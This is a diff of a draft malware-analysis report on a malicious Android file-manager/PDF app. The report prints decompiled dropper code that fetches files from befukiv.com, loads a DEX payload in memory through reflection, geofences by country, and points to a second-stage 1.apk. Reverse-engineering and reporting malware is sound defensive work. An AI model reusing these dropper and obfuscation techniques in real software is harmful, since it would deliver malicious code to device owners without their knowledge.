@@ -66,60 +66,13 @@ jadx -d out classes.dex
 
 ## Walkthrough
 
-The main application files are present at **com.tragisoap.fileandpdfmanager**, so it makes sense to start from here our search. Most of the files appear harmless, but when coming across the class _PartPreviewActivity_, we can notice some strange patterns in the code.
+
+TODO
+1. Add flowchart of the malicious process.
+2. Starts from _PreviewActiviy_ where it will call _FileMnanagerService_ which in turn will call _fetchFilesAndProces_
 
 ```java
-public final void onCreate(Bundle bundle) {
-    String str;
-    String str2 = "tura dar";
-    super.onCreate(bundle);
-    s().t(1);
-    getWindow().setStatusBarColor(0);
-    setContentView(2131492981);
-    TextView textView = (TextView) findViewById(2131296755);
-    try {                                                               // First try
-        m.f3835d.invoke(null, this);                
-    } catch (IllegalAccessException | InvocationTargetException e) {
-        e.printStackTrace();
-    }
-    Button button = (Button) findViewById(2131296492);
-    try {                                                               // Second try
-        str = (String) m.f3833b.invoke(null, new Object[0]);
-    } catch (IllegalAccessException | InvocationTargetException e7) {
-        e7.printStackTrace();
-        str = "tura dar";
-    }
-    textView.setText(str);
-    try {                                                               // Third try
-        str2 = (String) m.f3834c.invoke(null, new Object[0]);
-    } catch (IllegalAccessException | InvocationTargetException e8) {
-        e8.printStackTrace();
-    }
-    button.setText(str2);
-    button.setOnClickListener(new q(4, this));
-}
-```
-
-It is not that common for an application to successively try and expect the same exception in such a short time, and this may suggest that the developer expects some kind of resistance from the system. The most concerning section however is present on the _onNewIntent_ method of the same class, where we find that the application requests information of the system regarding its **package installation permissions** as a condition for an action.
-
-```java
-public final void onNewIntent(Intent intent) {
-    super.onNewIntent(intent);
-    Bundle extras = intent.getExtras();
-    if ("com.tragisoap.fileexplorerpdfviewer.SESSION_API_PACKAGE_INSTALLED".equals(intent.getAction()) && extras.getInt("android.content.pm.extra.STATUS") == -1) {
-        startActivity((Intent) extras.get("android.intent.extra.INTENT"));
-    }
-}
-```
-
-Looking back at the successive tty, using `JADX` we can find where the methods that are trying to be triggered are declared. We renamed the class that defines them to _Malicious_.
-
-### Exploring Application External Accesses
-
-In the _Malicious_ class, we can see that it downloads additional files from external services.
-
-```java
-public static void a() {
+public static void fetchFilesAndProcess() {
     String str;
     Session session = new Session();
     HttpHandler.getRequest getrequest = new HttpHandler.getRequest();
@@ -167,54 +120,16 @@ At the time this report is being written, the server is accessible, but the reso
 
 But we have access to these files as they were previously downloaded, so it's possible to continue our analysis.
 
-### Exploring 'muchaspuchas' and 'cortina' files
+### Exploring 'muchaspuchas'
 
-The 'muchaspuchas' file is composed of what seems to be Java method or class names separated by the | character. The function where this file is being downloaded splits the file contents by the | character.
+The **'muchaspuchas'** file is composed of what seems to be Java method or class names separated by the | character. The function where this file is being downloaded splits the file contents by the | character.
 
 ```
 dalvik.system.InMemoryDexClassLoader|getClassLoader|loadClass|com.travisscott.pdf.MainLibrary|...
 ```
 
-Given that information, we may assume that Java code is parsing these names and then calling them through reflection.
+This shows that the authors maybe wanted to obfuscate application method calls with reflection. To confirm this assumption we decided to analyze `mapMuchasStringsToMethods` function and deofuscated it in the following way.
 
-## Exploring readable files
-
-We can see that inside function a() (obfuscated) a string is being split by the '|' character. To make it more clear we performed deofuscation and achieved the following result
-
-```java
-public static void fetchFilesAndProcess() {
-        String str;
-        Session session = new Session();
-        HttpHandler.getRequest getrequest = new HttpHandler.getRequest();
-        getrequest.request("https://befukiv.com/muchaspuchas");
-        HttpHandler call = getrequest.call();
-        HttpHandler.getRequest getrequest2 = new HttpHandler.getRequest();
-        getrequest2.request("https://befukiv.com/cortina");
-        HttpHandler call2 = getrequest2.call();
-        try {
-            ParseHttpResponseBody parseHttpResponseBody = new setupTls(session, call).Execute().responseBody;
-            byte[] parse = parseHttpResponseBody.parse();
-            TwoStrings twoStrings = parseHttpResponseBody.getTwoStrings();
-            Charset charset = z4.h.utf8Charset;
-            if (twoStrings != null && (str = twoStrings.secondStr) != null) {
-                charset = Charset.forName(str);
-            }
-            muchasStrings.set(new String(parse, charset.name()).split("\\|"));
-            byte[] parse2 = new setupTls(session, call2).Execute().responseBody.parse();
-            if (fetchAndProcessCompleted.get()) {
-                return;
-            }
-            fw.getClass();
-            FileWriter.mapMuchasStringsToMethods(parse2);
-            fetchAndProcessCompleted.set(true);
-        } catch (Throwable th) {
-            th.printStackTrace();
-        }
-    }
-```
-
-As we can see, the function is fetching the files and is then it maps 'muchaspuchas' strings into application methods.
-This shows that the authors maybe wanted to obfuscate application method calls with reflection. To confirm this assumption we decided to analyze `mapMuchasStringsToMethods` function and deofuscated it in the following way
 ```java
     public static void mapMuchasPuchasToMethods(byte[] bArr) {
         Class inMemoryDexClassLoader = (Class) getClassInstanceByMethodName(Malicious.muchasStrings.get()[0]); // dalvik.system.InMemoryDexClassLoader
@@ -234,19 +149,136 @@ From that, we can see that the function is using java reflection to dynamically 
 
 `mapMuchasStringsToMethods` receives as an argument a byte array containing data from `cortina` file. It seems that it's loading a class based on the binary file. Based on that we decided to analyze as a next step, to analyze cortina file.
 
-
-### Exploring cortina file
-[TODO]...
-
-
-
+### Exploring 'cortina'
 TODO
-1. muchaspuchas maybe a CSV type file
-2. Based on 1., we look for split functions.
-3. Explore 'mapMuchasPuchasToMethods' line 2 (Class cls = (Class) inMemory...)
+1. Cortina is a DEX file with the package _travisscot_, we can confirm this by running `$ file cortina`
+2. Open `cortina.dex` in JADX.
+3. _travisscot_ is invoked at the end of the `mapMuchasPuchasToMethods` method.
+4. _travisscot_ functions as a library that extends the main file with functionalities.
 
+```java
+public class FileManagerService extends f {
 
+    /* renamed from: j */
+    public static final /* synthetic */ int f3513j = 0;
 
+    @Override // f1.f
+    public final void a() {
+        try {
+            Malicious.fetchFilesAndProcess();
+            try {
+                Malicious.makePdfPage.invoke(null, this);
+            } catch (IllegalAccessException | InvocationTargetException e) {
+                e.printStackTrace();
+            }
+        } catch (Throwable th) {
+            th.printStackTrace();
+            Intent intent = new Intent(this, MainActivity.class);
+            intent.addFlags(268435456);
+            startActivity(intent);
+        }
+    }
+}
+```
+
+All that we have seen so far as happened when the `Malicious.fetchFilesAndProcess` was called which then resulted in a an additional set of functions to be loaded. One of this function, `makePdfPage` is called after the package is loaded.
+
+```java
+public static void makePdfPage(Context context) {
+    ServiceHandler.handleWork(context);
+}
+```
+
+It then calls yet another function, also from the _travisscot_ package which is shown bellow.
+
+```java
+public static void handleWork(Context context) {
+    if (Build.MODEL != null && !Build.MODEL.isEmpty() && Build.MANUFACTURER != null
+            && !Build.MANUFACTURER.isEmpty()) {
+        TelephonyManager tm = (TelephonyManager) context.getSystemService("phone");
+        String country = tm.getNetworkCountryIso().isEmpty() ? "uat" : tm.getNetworkCountryIso();
+        if (isManuFacturerGood() && !checkBuildConfig()) {
+            if (!country.startsWith("es") && !country.startsWith("sk") && !country.startsWith("cz")
+                    && !country.startsWith("ru") && !country.startsWith("hr") && !country.startsWith("si")
+                    && !country.startsWith("sl") && !country.startsWith("bg") && !country.startsWith("ee")
+                    && !country.startsWith("fi") && !country.startsWith("ie") && !country.startsWith("gb")) {
+                Intent i = new Intent(context, MainLibrary.getMainActivity());
+                i.addFlags(268435456);
+                context.startActivity(i);
+                return;
+            }
+            try {
+                MainLibrary.url.set("https://befukiv.com/1.apk");
+                Intent i2 = new Intent(context, MainLibrary.getPartPreviewActivity());
+                i2.addFlags(268435456);
+                context.startActivity(i2);
+            } catch (Exception e) {
+                e.printStackTrace();
+                Intent i3 = new Intent(context, MainLibrary.getMainActivity());
+                i3.addFlags(268435456);
+                context.startActivity(i3);
+            }
+        }
+    }
+}
+```
+
+This method will check in which country the current device is operating and stop execution for a selected list of countries. We don't know why it does this, one guess could be that the domain from where it is trying to download the fil, _1.apk_ is blocked in those country. If it not in one of those country, it stores the url in has an attribute of the _MainActivity_ class.
+
+After doing this, it creates a new _Intent_ object and starts the activity of the _PartPreviewActiviy_ class.
+
+```java
+public final void onCreate(Bundle bundle) {
+    String str;
+    String str2 = "tura dar";
+    super.onCreate(bundle);
+    s().t(1);
+    getWindow().setStatusBarColor(0);
+    setContentView(2131492981);
+    TextView textView = (TextView) findViewById(2131296755);
+    try {                                                               // First try
+        m.f3835d.invoke(null, this);                
+    } catch (IllegalAccessException | InvocationTargetException e) {
+        e.printStackTrace();
+    }
+    Button button = (Button) findViewById(2131296492);
+    try {                                                               // Second try
+        str = (String) m.f3833b.invoke(null, new Object[0]);
+    } catch (IllegalAccessException | InvocationTargetException e7) {
+        e7.printStackTrace();
+        str = "tura dar";
+    }
+    textView.setText(str);
+    try {                                                               // Third try
+        str2 = (String) m.f3834c.invoke(null, new Object[0]);
+    } catch (IllegalAccessException | InvocationTargetException e8) {
+        e8.printStackTrace();
+    }
+    button.setText(str2);
+    button.setOnClickListener(new q(4, this));
+}
+
+@Override // androidx.fragment.app.q, androidx.activity.ComponentActivity, android.app.Activity
+public final void onNewIntent(Intent intent) {
+    super.onNewIntent(intent);
+    Bundle extras = intent.getExtras();
+    if ("com.tragisoap.fileexplorerpdfviewer.SESSION_API_PACKAGE_INSTALLED".equals(intent.getAction()) && extras.getInt("android.content.pm.extra.STATUS") == -1) {
+        startActivity((Intent) extras.get("android.intent.extra.INTENT"));
+    }
+}
+
+@Override // androidx.fragment.app.q, android.app.Activity
+public final void onResume() {
+    super.onResume();
+    try {
+        Malicious.getName.invoke(null, this);
+    } catch (IllegalAccessException | InvocationTargetException e) {
+        e.printStackTrace();
+    }
+}
+```
+
+TODO: continue to follow the flow
 
 
 Going through the _1.apk_ files, we encountered a package named "juw.khdqwmf.xftkgphgq.fhyu" containing Chinese characters. After translating these strings using Google Translate, we determined that these characters formed simple Chinese sentences unrelated to the application's purpose. Further exploration revealed that **these strings were translated into package names when passed through a function**. This indicates that the original authors chose to obscure package names using Chinese strings.
